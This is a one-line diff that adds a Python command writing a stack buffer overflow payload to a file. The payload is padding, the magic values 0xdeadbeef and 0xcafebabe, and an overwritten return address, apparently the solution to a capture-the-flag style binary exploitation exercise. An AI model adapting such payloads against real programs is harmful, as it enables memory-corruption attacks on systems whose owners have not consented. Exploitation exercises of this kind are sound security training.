@@ -1,0 +1,1 @@
+python -c 'print "A"*32 + "\xef\xbe\xad\xde" + "\xbe\xba\xfe\xca" + "B"*36 + "\x06\x85\x04\x08"' > payload
